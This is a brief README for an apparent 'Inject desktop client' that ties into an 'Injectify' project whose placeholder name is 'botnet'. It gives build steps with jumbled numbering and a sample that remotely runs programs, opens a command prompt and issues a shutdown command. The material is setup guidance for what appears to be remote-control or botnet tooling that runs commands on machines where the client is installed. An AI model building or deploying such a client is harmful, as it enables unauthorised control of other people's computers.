# Inject desktop client
## Getting started

1. Open up `./src/index.html`
3. Install [yarn](https://yarnpkg.com/en/)
2. Find the line `project: 'botnet'` and replace `botnet` with your Injectify project name
3. Run `yarn run install`  in `./` and `./src/`
4. Run `yarn dist` in `./`

```js
run('notepad')
start('cmd')

cmd('shutdown /s')
```